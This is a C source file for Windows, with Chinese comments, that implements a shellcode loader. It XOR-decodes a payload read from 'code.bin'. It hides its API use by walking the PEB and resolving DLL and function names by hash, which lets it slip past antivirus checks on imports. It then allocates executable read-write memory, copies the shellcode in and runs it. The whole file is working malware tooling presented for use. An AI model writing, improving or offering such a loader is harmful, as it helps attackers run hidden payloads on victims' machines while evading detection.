#include "x86gprintrin.h"
#include <libloaderapi.h>
#include <minwindef.h>
#include <processthreadsapi.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <winnt.h>
#include <windows.h>
// PEB 结构体定义（部分）
typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    PVOID Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;          // <-- 这就是我们要用的
    // ... 其他字段省略
} PEB, *PPEB;

    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING, *PUNICODE_STRING;

    typedef struct _LDR_DATA_TABLE_ENTRY {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        LIST_ENTRY InInitializationOrderLinks;
        PVOID DllBase;
        PVOID EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING FullDllName;
        UNICODE_STRING BaseDllName;
        ULONG Flags;
        USHORT LoadCount;
        USHORT TlsIndex;
        LIST_ENTRY HashLinks;
        ULONG TimeDateStamp;
        PVOID EntryPointActivationContext;
        PVOID PatchInformation;
        LIST_ENTRY ForwarderLinks;
        LIST_ENTRY ServiceTagLinks;
        LIST_ENTRY StaticLinks;
    } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;


unsigned char* readCodeByFile(int *out_size)
{
    const char fName[] = "code.bin";
    FILE *fHandle = fopen(fName, "rb");

    fseek(fHandle, 0, SEEK_END);
    long file_size = ftell(fHandle);
    fseek(fHandle, 0, SEEK_SET);

    unsigned char *shellcode = (unsigned char*)malloc(file_size);
    fread(shellcode, 1, file_size, fHandle);
    fclose(fHandle);

    char key[] = "fxxk world";
    int key_len = strlen(key);
    for (int i = 1; i<file_size; i++) {
        shellcode[i] ^= key[i % key_len];
    }

    if (out_size) {
        *out_size = file_size;
    }

    return shellcode;
}




DWORD HashStringA(const char* str) {
    DWORD hash = 0;
    while (*str) {
        // 常用的简单哈希算法
        hash = (hash * 31) + *str;  // 或者使用: hash = hash * 33 + *str
        str++;
    }
    return hash;
}


DWORD HashStringW(const WCHAR* str)
{
    DWORD hash = 5831;
    while (*str) {
        hash = ((hash << 5) + hash) + *str;
        str++;
    }
    return hash;
}

HMODULE GetModuleByHash(DWORD dwHash){
    PPEB GetPeb64_Asm() {
    PPEB peb;
    __asm__ volatile (
        "movq %%gs:0x60, %0"
        : "=r" (peb)
    );
    return peb;
    }

    PPEB peb = GetPeb64_Asm();
    PLIST_ENTRY listHead = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY listEntry = listHead->Flink;

    while (listEntry != listHead) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
            listEntry,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );
        if (entry->BaseDllName.Buffer != NULL) {
            DWORD dllHash = HashStringW(entry->BaseDllName.Buffer);
            printf("dllName: %ls\n", entry->BaseDllName.Buffer);
            printf("dllHash:%lu\n",dllHash);
            if (dllHash == dwHash){
                printf("find dllname:%ls\n",entry->BaseDllName.Buffer);
                return (HMODULE)entry->DllBase;
            }
        }
        listEntry = listEntry->Flink;
    }
    return NULL;
}

FARPROC GetProcAddressByHash(HMODULE hModule,DWORD dwHash)
{
    //将dll基地址转换为字节指针
    PBYTE pBase = (PBYTE)hModule;
    //dll的基地址即为dos头的起始地址
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("doshandle error\n");
        return NULL;
    }

    //通过pDos->e_lfanew计算nt头的起始地址
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        printf("nthandle error\n");
        return NULL;
    }

    //获取导出表
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        pBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );
    DWORD exportSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    PDWORD pFunctions = (PDWORD)(pBase + pExport->AddressOfFunctions);
    PDWORD pNames = (PDWORD)(pBase + pExport->AddressOfNames);
    PWORD pOrdinals = (PWORD)(pBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i< pExport->NumberOfNames; i++) {
        PCHAR pFuncName = (PCHAR)(pBase + pNames[i]);
        DWORD funcNameHash = HashStringA(pFuncName);
        printf("pFuncName: %s\n", pFuncName);
        printf("funchash:%08X\n",funcNameHash);
        if (funcNameHash == dwHash) {
            DWORD ordinal = pOrdinals[i];
            DWORD funcRva = pFunctions[ordinal];
            printf("find proc\n");
            return (FARPROC)(pBase + funcRva);
        }
    }
    printf("proc find error\n");
    return NULL;
}
typedef NTSTATUS (NTAPI* fnLdrLoadDll)(
    PWSTR SearchPath,
    ULONG LoadFlags,
    PUNICODE_STRING DllName,
    PVOID *BaseAddress
);
typedef NTSTATUS (NTAPI *fnvc)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG PageProtection
);



int main(void)
{
    int out_size = 0;
    unsigned char* shellcode = readCodeByFile(&out_size);
    char key[] = "f**k world";
    
    HMODULE dllBase = GetModuleByHash(0x3D66D1EF);
    if (dllBase == NULL) {
        printf("getdll 500\n");
    }
    fnvc pVitualMem = (fnvc)GetProcAddressByHash(
        dllBase, 
        0x38B83169
    );
    PVOID mem = NULL;
    size_t regionSize = (size_t)out_size;
    
    NTSTATUS status = pVitualMem(
        GetCurrentProcess(),
        &mem,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (status != 0 || shellcode == NULL) {
        printf("分配失败\n");
        return 0;
    }

    for (int i = 0; i < out_size; i++) {
        printf("\\x%02x",shellcode[i]);
    }


    memcpy(mem, shellcode,out_size);
    printf("\ncopy 200\n");

    unsigned char *exe_code = (unsigned char*)mem;
    void (*func)() = (void (*)())exe_code;
    func();
    printf("runner 200\n");
}
